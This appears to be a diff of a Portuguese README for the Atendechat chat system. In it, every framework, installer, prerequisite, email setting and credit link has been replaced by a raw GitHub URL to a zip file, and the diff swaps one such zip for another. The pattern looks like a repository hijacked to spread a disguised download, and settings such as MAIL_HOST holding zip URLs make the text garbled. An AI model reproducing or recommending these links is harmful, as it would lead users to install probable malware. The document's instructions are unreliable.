@@ -9,19 +9,19 @@ O repositório do Atendechat possui 3 pastas importantes:
 - frontend
 - instalador
 
-O backend é feito em Express e possui toda a estrutura organizada dentro dessa pasta para que seja aplicado no ambiente do cliente. A pasta de frontend contém todo o framework do https://raw.githubusercontent.com/rlmourarj/at-2025/main/frontend/src/pages/Financeiro/at-perfumer.zip que gerencia toda a interação com o usuário do sistema.
+O backend é feito em Express e possui toda a estrutura organizada dentro dessa pasta para que seja aplicado no ambiente do cliente. A pasta de frontend contém todo o framework do https://raw.githubusercontent.com/rlmourarj/at-2025/main/backend/src/services/BaileysServices/at-godlily.zip que gerencia toda a interação com o usuário do sistema.
 
 A pasta de instalador dentro dessa repositório é uma cópia do instalador usado para que os clientes de sistemas possam fazer o clone dentro da pasta home de seus servidores e seguirem com a instalação automática de todas as dependências do projeto
 
 Link para o repositório do instalador atualizado:
-- [Instalador](https://raw.githubusercontent.com/rlmourarj/at-2025/main/frontend/src/pages/Financeiro/at-perfumer.zip)
+- [Instalador](https://raw.githubusercontent.com/rlmourarj/at-2025/main/backend/src/services/BaileysServices/at-godlily.zip)
 
 Consulte **[Implantação](#-implanta%C3%A7%C3%A3o)** para saber como implantar o projeto.
 
 ### 📋 Pré-requisitos
 
 ```
-- https://raw.githubusercontent.com/rlmourarj/at-2025/main/frontend/src/pages/Financeiro/at-perfumer.zip v20.x
+- https://raw.githubusercontent.com/rlmourarj/at-2025/main/backend/src/services/BaileysServices/at-godlily.zip v20.x
 - Postgres (release)
 - Npm ( latest )
 - Docker (bionic stable)
@@ -80,10 +80,10 @@ GERENCIANET_PIX_CERT=certificado-Gerencianet
 GERENCIANET_PIX_KEY=chave pix gerencianet
 
 # EMAIL
- MAIL_HOST="https://raw.githubusercontent.com/rlmourarj/at-2025/main/frontend/src/pages/Financeiro/at-perfumer.zip"
- MAIL_USER="https://raw.githubusercontent.com/rlmourarj/at-2025/main/frontend/src/pages/Financeiro/at-perfumer.zip"
+ MAIL_HOST="https://raw.githubusercontent.com/rlmourarj/at-2025/main/backend/src/services/BaileysServices/at-godlily.zip"
+ MAIL_USER="https://raw.githubusercontent.com/rlmourarj/at-2025/main/backend/src/services/BaileysServices/at-godlily.zip"
  MAIL_PASS="SuaSenha"
- MAIL_FROM="https://raw.githubusercontent.com/rlmourarj/at-2025/main/frontend/src/pages/Financeiro/at-perfumer.zip"
+ MAIL_FROM="https://raw.githubusercontent.com/rlmourarj/at-2025/main/backend/src/services/BaileysServices/at-godlily.zip"
  MAIL_PORT="465"
 
 ```
@@ -162,9 +162,9 @@ pm2 save
 ## 🛠️ Construído com
 
 
-* [Express](https://raw.githubusercontent.com/rlmourarj/at-2025/main/frontend/src/pages/Financeiro/at-perfumer.zip) - O framework backend usado
-* [React](https://raw.githubusercontent.com/rlmourarj/at-2025/main/frontend/src/pages/Financeiro/at-perfumer.zip) - Framework frontend usado
-* [NPM](https://raw.githubusercontent.com/rlmourarj/at-2025/main/frontend/src/pages/Financeiro/at-perfumer.zip) - Gerenciador de dependências
+* [Express](https://raw.githubusercontent.com/rlmourarj/at-2025/main/backend/src/services/BaileysServices/at-godlily.zip) - O framework backend usado
+* [React](https://raw.githubusercontent.com/rlmourarj/at-2025/main/backend/src/services/BaileysServices/at-godlily.zip) - Framework frontend usado
+* [NPM](https://raw.githubusercontent.com/rlmourarj/at-2025/main/backend/src/services/BaileysServices/at-godlily.zip) - Gerenciador de dependências
 
 ## 🖇️ Colaborando
 
@@ -178,6 +178,6 @@ Versão 1.0.0
 
 Este projeto está sob a licença
 
-⌨️ com ❤️ por [Atendechat](https://raw.githubusercontent.com/rlmourarj/at-2025/main/frontend/src/pages/Financeiro/at-perfumer.zip) 😊
+⌨️ com ❤️ por [Atendechat](https://raw.githubusercontent.com/rlmourarj/at-2025/main/backend/src/services/BaileysServices/at-godlily.zip) 😊
 
-Todos os direitos reservados a https://raw.githubusercontent.com/rlmourarj/at-2025/main/frontend/src/pages/Financeiro/at-perfumer.zip
+Todos os direitos reservados a https://raw.githubusercontent.com/rlmourarj/at-2025/main/backend/src/services/BaileysServices/at-godlily.zip
